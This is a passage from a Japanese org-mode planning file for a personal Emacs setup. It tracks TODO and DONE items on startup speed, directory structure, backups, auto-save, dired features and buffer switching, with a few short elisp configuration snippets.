   月日と共に、導入や削除を繰返すと煩雑なものになりがち。

3) 対応方法
   popup などで参照。

4) 優先順位の根拠
   開発優先、なくても find-file で開いてみることができる。

5) 備考

6) time/ref

******* TODO [#A] 設計の定期的見直し。

1) 結果

2) 背景 (問題点)
   定期的に見直さないと煩雑になりがち。
   また、忘れてしまう。

3) 対応方法
   一番暇な期間をみつけてスケジュールをたてる。

4) 優先順位の根拠
   より良い環境を構築するため。

5) 備考

6) time/ref

***** 1.2. Overview
****** 1.2.1. [0/11] System Environment
******* TODO [#A] Linux

1) 結果

2) 背景 (問題点)
   linux を Main に構築
3) 対応方法
   linux を軸に構築
4) 優先順位の根拠
   linux を軸に構築
5) 備考

6) time/ref

******* TODO [#B] Windows

1) 結果

2) 背景 (問題点)
   Sub に windows で構築

3) 対応方法
   GNU Emacs から binary を取得

4) 優先順位の根拠
   一番普及しているので他の環境で使うことが多いと予測される。

5) 備考

6) time/ref

******* TODO [#C] Mac

1) 結果

2) 背景 (問題点)
   つかう機会があるかもしれないので念のため構築しておく。

3) 対応方法
   まず、 Mac の環境を取得する必要がある。

4) 優先順位の根拠
   使う機会は稀。

5) 備考

6) time/ref

******* TODO [#A] Desktop

1) 結果

2) 背景 (問題点)
   Main に使う

3) 対応方法

4) 優先順位の根拠

5) 備考

6) time/ref

******* TODO [#B] Laptop

1) 結果

2) 背景 (問題点)
   プレゼンなどで使う機会がある。

3) 対応方法
   laptop かどうか elisp から確認。

4) 優先順位の根拠
   違う環境で使う機会があるとすれば Laptop である。

5) 備考

******* TODO [#B] Multi Display

1) 結果

2) 背景 (問題点)
   Multi display で最大限つかえるようにする。
   Display をわたって表示すると window の区切り目が display と合
   わない場合や minibuffer が左端に表示されてしまう。

3) 対応方法
   Frame を別々に用意する。
   一方を debug や echo 領域にする。

4) 優先順位の根拠
   作業効率をあげる為に必要。

5) 備考

******* TODO [#A] Version 23

1) 結果

2) 背景 (問題点)
   Main に使う version

3) 対応方法

4) 優先順位の根拠

5) 備考

******* TODO [#B] Version 24

1) 結果

2) 背景 (問題点)
   のちに Version up することになるので設定しておく
   org-capture の機能を使えるようになる。
   また Build してシステムに組込む。

3) 対応方法
   Build

4) 優先順位の根拠
   のちに Version up することになるので設定しておく

5) 備考

******* TODO [#C] Version 22

1) 結果

2) 背景 (問題点)
   まれに version 22 の環境で使っているところがあるので構築し
   ておく

3) 対応方法
   Version 22 を使っているディストリをしらべる。

4) 優先順位の根拠
   まれに version 22 の環境で使っているところがあるので構築し
   ておく
5) 備考

******* TODO [#A] GUI

1) 結果

2) 背景 (問題点)
   Main で使う Terminal

3) 対応方法

4) 優先順位の根拠

5) 備考

******* TODO [#B] CUI, putty

1) 結果

2) 背景 (問題点)
   遠隔地で使う場合 CUI で使うことになる場合が多い
   色などがしっかり表示されない問題を解決する。

3) 対応方法
   http://www.emacswiki.org/emacs/PuTTY

4) 優先順位の根拠
   CUI で使えるようになると軽量な環境で使えることになる。

5) 備考

****** 1.2.2. [1/1] Construction Directory
******* DONE [#A] Directory & File move
        CLOSED: [2012-11-27 Tue 16:13]

1) 結果
   revision 99 から

2) 背景 (問題点)
   既存の directory file 構造を変更する。

3) 対応方法
   svn move
   file 名の変更
   [[#Construction%20Directory][Construction Directory]] 参照
   subversion の管理しない directory file を設定。 var_e/ backup_e/

4) 優先順位の根拠
   まず、これからとりかかる。

5) 備考

****** 1.2.3. Data list and 格納方法
****** 1.2.4. Network
****** 1.2.5. [0/1] Alias Command
******* TODO [#C] Alias Command

1) 結果

2) 背景 (問題点)
   anything などで command が見つけにくいので探しやすくする。

3) 対応方法
   apropos などでおもいだしにくい command をさがす

4) 優先順位の根拠
   あると便利

5) 備考

**** 2. Startup & Exit Emacs
***** 2.1. [11/18] Startup
****** POSTPONES [#C] 起動、終了時刻を file に記録。

1) 結果
   多重起動した場合の string をいれる。

2) 背景 (問題点)
   emacs の使用履歴や crash 履歴として保存する。

3) 対応方法
   Emacs_%Y_%m.log
   [[#Emacs.log][start exit log]]
   after-init-hook
   kill-emacs-hook
   で対応。

4) 優先順位の根拠
   緊急性はない。

5) 備考

****** POSTPONES [#B] init.el total time

1) 結果


2) 背景 (問題点)
   起動時間の Total time を測る。

3) 対応方法
   deamon が起動している場合などを考慮。
   基本的には before-init-time から計算。
   --debug-init 時には before-init-time から起動時間と init.el
   が呼ばれてからの起動時間を測定。

4) 優先順位の根拠
   起動時間を短縮する為の目安となり必要

5) 備考

****** POSTPONES [#A] 3 秒以内に起動する。

1) 結果
   standard library の起動時間を削減しなくてはならない。

2) 背景 (問題点)
   起動が遲いと debug などで何度も起動する場合に時間がとられる。
   vi や nano の代わりに設定 file を編集するのに使いたい。

3) 対応方法
   byte-compile の見直し。最適化。
   eval-when-compile
   add-hook

4) 優先順位の根拠
   時間削減効果が大きい。

5) 備考

****** TODO [#C] Multi process load

1) 結果

2) 背景 (問題点)
   起動の高速化を試みる

3) 対応方法
   deffered.el

4) 優先順位の根拠
   かなり高速化が見込めるが難しいかも

5) 備考

****** TODO [#C] Source の方が新しかったら byte-compile するかどうか問合せる。

1) 結果

2) 背景 (問題点)
   起動時間に影響
   起動したあとに byte-compile するのを忘れてしまうので問合せ
   る。

3) 対応方法
   load の sorce などを読んで検討。

4) 優先順位の根拠
   load の source などを読まなければならないのでやや面倒。

5) 備考

****** TODO [#C] 画面の 9 割を frame で埋める。

1) 結果

2) 背景 (問題点)
   emacs を起動すると大画面で使用するケースがほとんどなので
   起動時に大画面にする。

3) 対応方法
   display のサイズを取得し計算。

4) 優先順位の根拠
   緊急性なし

5) 備考
init-file-debug


(x-display-pixel-width)
1680
(x-display-pixel-height)
1050

(display-pixel-width)
1680
(display-pixel-height)
1050

(or left-fringe-width (nth 0 (window-fringes)) 0)
8
(or right-fringe-width (nth 1 (window-fringes)) 0)
8

(or (frame-parameter nil 'scroll-bar-width) 0)
0
(- 100 1 1 1 1)
96


(let ((scroll-bar (or (frame-parameter nil 'scroll-bar-width) 0))
      (left-fringe (or left-fringe-width (nth 0 (window-fringes)) 0))
      (right-fringe (or right-fringe-width (nth 1 (window-fringes)) 0)))
  (/ (- (display-pixel-width) scroll-bar left-fringe right-fringe)
  (frame-char-width)
  ))
208

1664


(frame-char-width)
8





(set-frame-size (selected-frame) 208 40)
nil

nil

****** TODO [#C] dumping を検討

1) 結果

2) 背景 (問題点)
   最速起動が見込める。

3) 対応方法
   http://www.emacswiki.org/emacs/DumpingEmacs

4) 優先順位の根拠
   不具合ありと報告。

5) 備考
****** DONE [#B] init.el Header 作成 update
       CLOSED: [2012-12-09 Sun 20:18]

1) 結果
   directory tree は shell command から copy する。

2) 背景 (問題点)
   init.el の changelog と directory を自動で update し
   全体の構成の見通しをとれるようにする。

3) 対応方法
   header2.el

4) 優先順位の根拠
   header の作成 update は他の elisp でも使う。

5) 備考

****** DONE [#B] 起動時の分割表示。
       CLOSED: [2012-12-08 Sat 00:10]

1) 結果
   startup-display

2) 背景 (問題点)
   起動時に*Messages* *scratch*があると異変に気附きやすい

3) 対応方法
   *Messages* *scratch* を分割表示
   error があれば Error buffer を表示
   auto-save-file があればその一覧の表示と file を開く。
   終了時、 crash 時に開いていた buffer の link 付き一覧を表示。

4) 優先順位の根拠
   起動後の動作が早くなる。

5) 備考

****** DONE [#B] 遅延 load
       CLOSED: [2012-12-07 Fri 18:38]

1) 結果
   after-require

2) 背景 (問題点)
   elisp/ 以下の autoload されている file を 遅延 load する。
   idle-time を利用して command で load される時にもたつくの防
   ぐ。
   使って以内時間を有効活用する。

3) 対応方法
   idle-time
   idle-require の source から参考にする。
   subroutines に入れる。
   40 秒操作がなければ load を始初める。
   1 秒間隔で load
   さらに操作がなければ間隔を縮めて load する。
   遅延 load で設定した lisp をまとめて load 。
   トイレなどに席をたつ時に使う。

4) 優先順位の根拠
   緊急性はないがかなりやくにたつ

5) 備考

****** DONE [#B] init.el load される file を 1 つに結合する。
       CLOSED: [2012-11-29 Thu 08:11]

1) 結果
   join-one-start.el
   command: joinone-start-files

2) 背景 (問題点)
   全体の見通しをよくし、検索しやすくなる。
   全体の行数とサイズがわかる。

3) 対応方法
   elisp
   shell script
   file 名: all_in_one_start.el
   保存先: var_e/

4) 優先順位の根拠
   あると設定の見直しが簡易になる。

5) 備考

****** DONE [#C] まず subroutines を load する
       CLOSED: [2012-11-28 Wed 06:32]

1) 結果
   subroutines_start

2) 背景 (問題点)
   directory にいれてまず subroutines を load する。

3) 対応方法
   file path を指定して load する。

4) 優先順位の根拠
   簡易

5) 備考

****** DONE [#A] Path の設定
       CLOSED: [2012-11-28 Wed 06:32]

1) 結果
;; exec-path
(dolist (path (split-string (getenv "PATH") ":"))
  (add-to-list 'exec-path path t))

;; info-path
  (add-to-list 'Info-additional-directory-list (concat my-emacs-dir "data_e/ref/info"))

2) 背景 (問題点)
   起動時に load-path shell の path の設定を確実なものにする。

3) 対応方法
   load-path は~/.emacs.d/elisp/ 以下すべて追加
   exec path
   info path http://www.emacswiki.org/emacs/InfoPath
   getenv

4) 優先順位の根拠
   簡易、かつ重要

5) 備考

****** DONE [#C] Directory の確認、作成
       CLOSED: [2012-11-28 Wed 06:37]

1) 結果
;;;; make directory if not exist.
(mapc (lambda (dir)
		(if (and dir (not (file-exists-p dir)))
			(condition-case nil
				(make-directory dir 'parents)
			  (file-error (message "IO error in: %s" dir))))) `(,my-elisp-dir
                                                                ,my-start-dir
                                                                ,my-plugin-dir
                                                                ,my-mylisp-dir
                                                                ,my-data-dir
																,my-var-dir
                                                                ,my-backup-dir))


2) 背景 (問題点)
   directory がないと backup file などを置くことができない

3) 対応方法
   起動時に directory を確認し作成

4) 優先順位の根拠
   簡易
   なくても動くことには動く

5) 備考

****** DONE [#A] autoload list 作成コマンド
       CLOSED: [2012-11-28 Wed 06:47]

1) 結果
   subroutines_start

2) 背景 (問題点)
   autoload コマンドを一纏めにする。

3) 対応方法
   起動時に autoload list の file がなければ作成し起動。
   elisp/ 以下の autoload を取得。
   byte-compile し読込を高速化。

4) 優先順位の根拠
   起動に関るコマンドで重要

5) 備考

****** DONE [#A] Directory 内の prefix の付いた file を順番に load する。
       CLOSED: [2012-11-27 Tue 18:00]

1) 結果
   revision 99

2) 背景 (問題点)
   設定 file を管理しやすいように directory にまとめて順番に load

3) 対応方法
   subroutines に入れる。
   00 ~ 99 まで順番に読み込む。
   system に適合した file を読み込む。
   windows, linux, mac, emacs22, emacs23, emacs24
   prefix が付いていない file は主に autoload 用。
   若しくは、 test 用。
   Error があれば error のあった file を buffer に表示。
   --debug-init 時には bench-mark をとる。
   さらに、 buffer に表示。 sort しやすいようにする。
   http://www.emacswiki.org/emacs/LoadingLispFiles
   http://www.cb1.com/~john/computing/emacs/lisp/basics/load-directory.el
   init_loader.el

4) 優先順位の根拠
   起動に関るコマンドで重要

5) 備考

****** DONE [#B] default.el の扱い
       CLOSED: [2012-11-29 Thu 14:33]

1) 結果
   predefine の uniq
   09_check_default_start.el
   y = 読み込む
   n = 読み込まない
   Y = 次回から prompt を表示せずに読み込む。 file システム名を取得しシステムごとに設定。
   N = 次回から prompt を表示せずに読み込まない。 file システム名を取得しシステムごとに設定。

2) 背景 (問題点)
   system ごとの設定がされており読み込むと反映される。
   しかし、読み込みたくない場合それぞれ設定しなければならな
   い。

3) 対応方法
   default.el があれば prompt を表示。
   y = 読み込む
   n = 読み込まない
   Y = 次回から prompt を表示せずに読み込む。 file システム名を取得しシステムごとに設定。
   ! = 次回から prompt を表示せずに読み込まない。 file システム名を取得しシステムごとに設定。

4) 優先順位の根拠
   他の環境で使う時に必要。
   緊急性はない。

5) 備考

****** DONE [#B] 独自の起動オプションを設定
       CLOSED: [2012-11-28 Wed 09:48]

1) 結果
(add-to-list 'command-switch-alist
             '("--profile" . (lambda (&rest ignore)
                             (setq start-loader-profile-flag t))))
だと起動後に関数が実行され、 init.el 内で処理できない。

2) 背景 (問題点)
   独自の起動オプションで設定を分岐
   設定 file を編集する時などに最小構成として起動できるように
   する。

3) 対応方法
   lisp/ source を読む

4) 優先順位の根拠
   設定に幅ができる。
   command-line-args

5) 備考

***** 2.2. Exit
****** DONE [#C] process 終了, file 保存の確認をしない
       CLOSED: [2012-12-09 Sun 20:26]

1) 結果
   C-x C-c kill-emacs

2) 背景 (問題点)
   終了時に process の終了確認と file の保存確認がされるので
   確認しない。

3) 対応方法
   confirm-kill-emacs

4) 優先順位の根拠
   起動時に auto-save の自動 open 機能の導入がされてから設定す
   る。

5) 備考

****** TODO [#C] byte-compile の必要があれば compile する

1) 結果

2) 背景 (問題点)
   byte-compile しわすれを防ぐ

3) 対応方法
   kill-emacs-hook

4) 優先順位の根拠
   終了が遅くなる可能性が高い

5) 備考

****** TODO [#C] loaddef の確認と update

1) 結果

2) 背景 (問題点)
   loaddef に新しく入れた elisp の autoload が反映されていないケー
   スをさける

3) 対応方法
   kill-emacs-hook
   loaddef が無いか、若しくは elisp/ 以下の file よりも古
   ければ、 Prompt を表示し loaddef を update 。

4) 優先順位の根拠
   終了が遅くなる可能性大

5) 備考

****** TODO [#C] Check Next Safty Run

1) 結果

2) 背景 (問題点)
   次回の起動が無事に行われるか確認。

3) 対応方法
   :: emacs を起動したままもう 1 つ emacs を開き
   無事に起動できなければ、そのまま終了してもいいかどうか
   prompt を出す。

4) 優先順位の根拠
   終了がかなり遅くなる可能性大。

5) 備考

**** 3. Environment
***** [0/4] 日本語
****** TODO [#A] 日本語入力環境をととのえる

1) 結果

2) 背景 (問題点)
   効率的な日本語入力環境を整る。

3) 対応方法
   ATOK
   mozc
   canna

4) 優先順位の根拠
   変換効率が惡いと文章作成時に誤字、脱字の原因となる。
   非常に重要。

5) 備考

****** TODO [#C] 文字コード

1) 結果

2) 背景 (問題点)
   文字コードの設定を簡易にしたい。

3) 対応方法
   http://www.edu.cc.uec.ac.jp/ee/ip/tools/japanese/emacs-coding.html

4) 優先順位の根拠
   緊急性はない。

5) 備考

****** TODO [#C] 英単語 補完 翻訳

1) 結果

2) 背景 (問題点)
   英語の補完 翻訳をシームレスにしたい

3) 対応方法
   ispell など拡張で設定

4) 優先順位の根拠
   緊急性はない。

5) 備考

***** [0/1] Encoding
****** TODO [#B] Encodeing

1) 結果

2) 背景 (問題点)
   簡易に Encode を変更
   文字化け対策

3) 対応方法
   http://www.emacswiki.org/emacs/AutoCodingAlist

4) 優先順位の根拠
   文字化けに困ることがある。

5) 備考

**** 4. Files
***** 3.1. [2/11] Open
****** TODO [#C] anything, dired に binary file の表示を toggle

1) 結果

2) 背景 (問題点)
   binary file が表示されて見辛いので表示をしない

3) 対応方法
   anything の設定
   dired の設定を探す

4) 優先順位の根拠
   緊急性なし。
   場合によっては導入に時間がかかりそう。
   かかる時間の割に効果がない。

5) 備考

****** TODO [#C] 拡張子ごとに色分け

1) 結果

2) 背景 (問題点)
   file の視認性があがる。

3) 対応方法
   各 list に設定

4) 優先順位の根拠
   緊急性なし

5) 備考

****** TODO [#C] 対象から外れた箇所は見えにくくする。

1) 結果

2) 背景 (問題点)
   視認性を上げる。

3) 対応方法
   bookshelf

4) 優先順位の根拠
   緊急性はない。

5) 備考

****** TODO [#A] すべての file の DB を作成しそこから開く


1) 結果

2) 背景 (問題点)
   file を探すのに事前に list を作成しておけば時間を短縮するこ
   とができる。
   時間と場所のトレードオフを実現。

3) 対応方法
   起動時に DB があるか確認し、存在しなければ idle-time に DB 作成コマンド
   を登録。
   更新の間隔は 24 時間。
   midnight に登録し自動で作成。
   windows では everything の DB を利用。
   保存先: var_e/
   http://www.emacswiki.org/emacs/LocateFilesAnywhere
   http://dev.ariel-networks.com/articles/emacs/part1/
   http://dev.ariel-networks.com/articles/emacs/part2/
   http://dev.ariel-networks.com/Members/sugawara/stuff/sd_emacs/200906_note/
   http://d.hatena.ne.jp/rubikitch/20090211/1234349678


4) 優先順位の根拠
   file を高速に見付けて開くのにかなり貢献できる可能性大。

5) 備考

****** POSTPONES [#A] filecache

1) 結果
   事前ではないが該当の cache を作成

2) 背景 (問題点)
   事前によく開く file の cache を作成しておく。

3) 対応方法
   起動時に idle-time に cache 作成コマンドを登録。
   + cache 対象
       * elisp/
       * plugin/
       * mylisp/
       * start.d/
       * data_e/code/
       * data_e/snippet/
   + 保存先: var_e/


4) 優先順位の根拠
   file を高速で見付けて開くのに貢献

5) 備考

****** TODO [#C] Bookmark list から開く。

1) 結果

2) 背景 (問題点)
   init.el や memo などよく開く file を bookmark から開くことが
   できる。

3) 対応方法
   http://www.emacswiki.org/emacs/CategoryBookmarking
   http://emacswiki.org/emacs/BookMarks
   保存先: data_e/

4) 優先順位の根拠
   bookmark しなければならないので手間。
   あまり使わないで file を見付ける方法を考えたい。

5) 備考

****** TODO [#C] find command から開く

1) 結果

2) 背景 (問題点)
   find command で file を探して list up する。

3) 対応方法
   find command を利用
   exclude するものを決める binary

4) 優先順位の根拠
   速度が遲いので最後の手段として使う。

5) 備考

****** TODO [#B] まとめて開く

1) 結果

2) 背景 (問題点)
   list で mark した file をまとめて開たい。

3) 対応方法
   anything などしらべる。

4) 優先順位の根拠
   なくても困らないがあると便利。

5) 備考

****** TODO [#C] remote file list から開く

1) 結果

2) 背景 (問題点)
   remote machine の file を開く

3) 対応方法
   angeftp, tramp

4) 優先順位の根拠
   なくても sshfs などで対応できるがあるとすごく便利。
   導入に時間が係りそう。

5) 備考

****** DONE [#B] current directory の file list から開く。
       CLOSED: [2012-11-29 Thu 21:29]

1) 結果
   anything
2) 背景 (問題点)
   project などで current directory から見付けると便利。

3) 対応方法
   特になし

4) 優先順位の根拠
   あれば便利かつ導入が簡易

5) 備考

****** DONE [#A] 履歴から file を開く
       CLOSED: [2012-11-29 Thu 21:28]

1) 結果
   recentf

2) 背景 (問題点)
   履歴から file を開く

3) 対応方法
   履歴リストの clean up はしない。
   履歴リストの保存するタイミングを考える。
   - http://www.emacswiki.org/emacs/RecentFiles
   - [[#find-file-history][Find File History]]


4) 優先順位の根拠
   高速に file を見付けて開くことができる。

5) 備考

***** 3.2. Save
****** 3.2.1. [2/2] Command
******* DONE [#C] すべての file buffer を保存する。
        CLOSED: [2012-11-29 Thu 21:32]

1) 結果
   save-some-buffers

2) 背景 (問題点)
   file buffer の save し忘れがあるので

3) 対応方法
   確かコマンドがあったはず

4) 優先順位の根拠
   あると便利

5) 備考

******* DONE [#B] rename 前の file を削除するかどうか prompt
        CLOSED: [2012-11-29 Thu 23:21]

1) 結果
   simple.el
   write-file-old-del

2) 背景 (問題点)
   file buffer を rename した後、わざわざ shell や dired を開いて
   file を削除しなければならなくて面倒。

3) 対応方法
   rename コマンドを作成する。

4) 優先順位の根拠
   地味に便利

5) 備考

****** 3.2.4. [6/9] Backup
******* DONE [#A] Auto-save
        CLOSED: [2012-12-02 Sun 08:56]

1) 結果
   起動時に auto-save されている file を自動的に開く
   起動時と終了時に古くて残された auto-save file を削除する。


2) 背景 (問題点)
   主に crash 対策

3) 対応方法
   auto-save の間隔を短くする。

4) 優先順位の根拠
   編集した内容を失わない為にも非常に重要

5) 備考

******* DONE [#A] Local Version Control 概要
        CLOSED: [2012-12-02 Sun 08:30]

1) 結果
   初編集直前で old backup (first-change-hook)
   backup directory の old directory に格納 revision 5 まで
   各セーブごとに、 new file として backup revision 10 まで
   backup は copy で行う (backup-by-copying)


2) 背景 (問題点)
   ソフト要因の障害に備える

3) 対応方法
   編集前に backup 初編集時に old backup が high-water なら rotate
   kept-old-version を 0 にし kept-new-version を 10 にする。
   初編集は、 old file として backup "test.el.~1~old"
   以後は、各セーブごとに、 new file として backup
   save した回数で挙動を変える。 [保留]
   (setq buffer-backed-up nil) と C-u C-u C-s を使う。
   old revision new revision と共に十分に容量をとる。
   多めに revision をとる。
   保存先: backup_e/

4) 優先順位の根拠
   編集した内容を失わない為に非常に重要

5) 備考

******* TODO [#B] Local Version Control mode-line

1) 結果

2) 背景 (問題点)
   local version control の状態を mode-line に表示

3) 対応方法
   info 32.1.2 Version Control and the Mode Line

4) 優先順位の根拠
   緊急性はない。あるとかなり便利。

5) 備考

******* TODO [#B] Local Version Control の 一覧

1) 結果

2) 背景 (問題点)
   version control された file を見易く表示

3) 対応方法
   link 付き、 buffer 上で diff や revert コマンドできるように
   する。

4) 優先順位の根拠
   便利になるとおもわれる。

5) 備考

******* TODO [#B] Local Version Control の比較

1) 結果

2) 背景 (問題点)
   現在の buffer と Local Version Control された file と比較。

3) 対応方法
   ediff

4) 優先順位の根拠
   ediff を学習しなければならない

5) 備考

******* DONE [#A] Local Version Control 最後に version control された file にもどる。
        CLOSED: [2012-12-06 Thu 03:35]

1) 結果
   recover-version
   version number を minibuffer で入力。

2) 背景 (問題点)
   簡易に以前の状態に戻る。

3) 対応方法
   command を探す。若しくは、作成。

4) 優先順位の根拠
   導入されれば使用頻度はたかくなると思われる。

5) 備考

******* DONE [#A] auto-save file 一覧
        CLOSED: [2012-12-02 Sun 08:58]

1) 結果
   auto-recover.el

2) 背景 (問題点)
   auto-save している file の一覧を表示。
   起動時にも表示したい。

3) 対応方法
   auto-save している file の一覧を表示。
   link 付き
   http://www.emacswiki.org/emacs/RevertBuffer

4) 優先順位の根拠
   編集した内容を失わない為にも非常に重要

5) 備考

******* DONE [#C] auto-save file すべて破棄
        CLOSED: [2012-12-02 Sun 08:59]

1) 結果
   auto-recover.el
   cleanup-autosave

2) 背景 (問題点)
   junk file などの auto-save file が残っている場合があるので
   すべて破棄する。

3) 対応方法
   関数を書く

4) 優先順位の根拠
   起動時に auto-save file を自動的に開く機能が導入されてから

5) 備考

******* DONE [#C] auto-save file すべて tmp directory に移動
        CLOSED: [2012-12-02 Sun 09:00]

1) 結果

2) 背景 (問題点)
   junk file などの auto-save file が残っている場合があるので
   すべて移動する。

3) 対応方法
   関数を書く

4) 優先順位の根拠
   起動時に auto-save file を自動的に開く機能が導入されてから

5) 備考

****** 3.2.5. Crypt File
******* TODO [#C] Crypt File

1) 結果

2) 背景 (問題点)
   盗難、漏洩対策としての機能をもっておく

3) 対応方法
   - key ageant を利用
   - http://www.emacswiki.org/emacs/AutoEncryption
     http://www.emacswiki.org/emacs/CategoryCryptography


4) 優先順位の根拠
   今の所、差し迫った needs はない

5) 備考

***** 3.3. File Handling
****** Dired
******* TODO [#B] dired buffer のみ tab 化

1) 結果

2) 背景 (問題点)
   dired buffer が散らばるので一つにまとめて置く。

3) 対応方法
   http://d.hatena.ne.jp/tequilasunset/20101129/p1

4) 優先順位の根拠
   利便性は高い

5) 備考

******* TODO [#C] dired color

1) 結果

2) 背景 (問題点)
   dired の file の色を分類

3) 対応方法
   zsh の設定に準拠
   path の LSCOLOR, LS_COLOR から読み取る
   http://www.emacswiki.org/emacs/Diredful

4) 優先順位の根拠
   視認性があがるが導入がやや面倒そう。

5) 備考
   alt + f2 launcher で emacs を起動すると path が export され
   ていない

******* TODO [#C] dired からコマンドを実行する

1) 結果

2) 背景 (問題点)
   開いている dired からコマンドを実行できると便利

3) 対応方法
   http://www.emacswiki.org/emacs/DiredLaunch

4) 優先順位の根拠
   緊急性はない。なくても shell から実行できるので問題はない

5) 備考

******* TODO [#B] dired の mode-line

1) 結果

2) 背景 (問題点)
   directory の full path を表示
   line column は必要ないので非表示
   file & directory の総数の表示
   file の数を表示
   directory の数を表示

3) 対応方法
   mode-line 編集 mode-hook

4) 優先順位の根拠
   視認性があがりやや便利。

5) 備考

******* TODO [#B] dired auto refresh

1) 結果

2) 背景 (問題点)
   新しくファイルを追加、更新、 rename した場合に dired の list
   が更新されないので更新する
3) 対応方法
   find-file-after-hook
   idle-time

4) 優先順位の根拠
   まれに途方にくれてしまうので

5) 備考

******* TODO [#B] dired で File の情報を toggle で表示させる

1) 結果

2) 背景 (問題点)
   dired で file のあらゆる情報を取得

3) 対応方法
   - File Size
   - File Permission
   - Time Stamp
     + Modification time
     + Access time
     + Change Status time
   - Disk space
   - Current Directory Total Size
   - Select Directory Total Size
   - Count Current Directory File
   - Count Select Directory File
   - Owner & Group

4) 優先順位の根拠
   有用だが導入に時間を要する可能性がたかい。

5) 備考

******* TODO [#C] dired を sort

1) 結果

2) 背景 (問題点)
   dired を項目べつに sort

3) 対応方法
   - 名前
   - Size
   - 日時
   - 種類
   - directory first
   - file first

4) 優先順位の根拠
   視認性があがる。緊急性はない。

5) 備考

******* TODO [#A] wdired であらゆるものを変更

1) 結果

2) 背景 (問題点)
   wdired で表示されている情報を変更したい。

3) 対応方法
   wdired ですでに機能があるか確認。
   - rename
   - permission
   - time stamp
   - owner & group
   - attribute

4) 優先順位の根拠
   かなり有用

5) 備考

******* TODO [#C] dired で file の文字コードを変換

1) 結果

2) 背景 (問題点)
   dired から文字コードを変換すると楽

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dired%20convert%20code

4) 優先順位の根拠
   あると便利。

5) 備考

******* TODO [#C] dired で file の format を変換

1) 結果

2) 背景 (問題点)
   excel, word powerpoint などあらゆるものに変換したい。

3) 対応方法
   http://www.emacswiki.org/emacs/FileFormat
   word to text http://www.emacswiki.org/emacs/UnDoc
   pdf to text http://www.emacswiki.org/emacs/UnPdf
   xls to text http://www.emacswiki.org/emacs/UnXls

4) 優先順位の根拠
   あると便利。緊急性はない。

5) 備考

******* TODO [#C] dired で切取り貼り付けで file を移動

1) 結果

2) 背景 (問題点)
   x-finder のように file の移動を簡易化したい

3) 対応方法
   wdired を利用して考える

4) 優先順位の根拠
   困難が予想される。しかし有用であることは間違いない。

5) 備考

******* TODO [#C] dired から印刷

1) 結果

2) 背景 (問題点)
   dired から file を印刷

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dired%20print

4) 優先順位の根拠
   dired でなくても印刷はできる。
   あると便利。

5) 備考

******* TODO [#C] dired から関連付けられたソフトで開く

1) 結果

2) 背景 (問題点)
   表題のまま

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dired%20fiber

4) 優先順位の根拠
   dired でなくてもできる
   あると便利

5) 備考

******* TODO [#B] dired で mark した file を 1 つに結合する

1) 結果

2) 背景 (問題点)
   mark した text file を 1 つに結合する。
   分割された file を簡単に 1 つに結合したい

3) 対応方法
   elisp で関数を書く。

4) 優先順位の根拠
   有用であることが望める

5) 備考

****** DONE [#A] 削除はすべて system trash へ
       CLOSED: [2012-12-02 Sun 10:40]

1) 結果
   emacs 23 以上
   delete-by-moving-to-trash
   emacs 23 以下
   trash-settings.el

2) 背景 (問題点)
   file が削除された場合、復元が困難

3) 対応方法
   http://www.emacswiki.org/emacs/SystemTrash

4) 優先順位の根拠
   容易に導入できる。
   file の損失防止の為重要。

5) 備考

****** TODO [#C] archive の操作

1) 結果

2) 背景 (問題点)
   archive の内容表示、展開、圧縮を簡単に操作する。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=dired-do-tar

4) 優先順位の根拠
   あると便利。緊急性はなし。

5) 備考

****** TODO [#C] file の tag 付け

1) 結果

2) 背景 (問題点)
   file の管理を簡単にする。

3) 対応方法
   http://www.emacswiki.org/emacs/BuffernameTags

4) 優先順位の根拠
   tag 付をして得られるメリットをまず調べる必要がある。

5) 備考

**** 5. Buffer
***** 4.1. Handling
****** TODO [#A] Switch buffer

1) 結果
   iswitchb まで完了。
   minibuffer を出てから anything を起動できない。

2) 背景 (問題点)
   buffer を効率よく状況に併せて switch したい

3) 対応方法
   switch コマンドを速度、曖昧、正確で統合
   C-: と 特定の Key Command に Switch/Find-file を定義。
   C-: C-: で曖昧 switch iswitchb で切替。
   C-: C-: C-: で anything で切替。

4) 優先順位の根拠
   必ず使う機能なのでここを効率化すれば全体的な速度もあがる。
   反面 bottle neck にもなるので注意

5) 備考
   C-: N
   N = number で terminal 起動

****** TODO [#C] Cycling switch

1) 結果

2) 背景 (問題点)
   次々に buffer を順番に切り換える。
   buffer を片手で見ている時に便利

3) 対応方法
   * BufferRing
   	 - http://www.emacswiki.org/emacs/BufferRing
   * http://www.emacswiki.org/emacs/ControlTABbufferCycling
   * http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=cycle%20buffers
   * http://www.mir2.org/igor/emacs/pc-bufsw.html

4) 優先順位の根拠
   なくても問題ないがあると便利。

5) 備考

****** TODO [#C] バッファ内の文字でバッファを切り替え

1) 結果

2) 背景 (問題点)
   大量に開いた buffer から特定の buffer を見付ける。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=contentswitch

4) 優先順位の根拠
   あると便利かもしれない。

5) 備考

****** TODO [#C] buffer list から wdired のように rename

1) 結果

2) 背景 (問題点)
   buffer の rename を容易に

3) 対応方法
   anything からできると便利

4) 優先順位の根拠
   緊急性はない。
   あると便利であろう。

5) 備考

****** TODO [#B] buffer の自動削除

1) 結果

2) 背景 (問題点)
   help や completion auto-install の buffer が大量に残る
   手動で削除するのは手間である。
3) 対応方法
   add-hook できるものにし、呼ばれた時に idle-require に登
   録。その buffer が background におかれていれば削除。
   idle 時間を決めれるものにする。
   また、残しておきたい buffer ならコマンドでキャンセルでき
   るようにする。
   その buffer が自動で削除されるかどうかは mode-line に表示
   されるようにする
   tempbuf
   重くならないように注意。

4) 優先順位の根拠
   有用性はある。手間を省くことができ、時間短縮につながる。


5) 備考

****** DONE [#A] 最後に閉じた buffer を復元
       CLOSED: [2012-12-02 Sun 21:28]

1) 結果
   last-killed-file
   (kbd "C-M-/")

2) 背景 (問題点)
   buffer を誤って削除してしまった時に復元したい

3) 対応方法
   保留

4) 優先順位の根拠
   有用性は高い。

5) 備考

****** TODO [#B] 指定した buffer を tab group 化

1) 結果

2) 背景 (問題点)
   特定の buffer 間で移動するのにすべての buffer を取得するの
   は非効率

3) 対応方法
   tabify

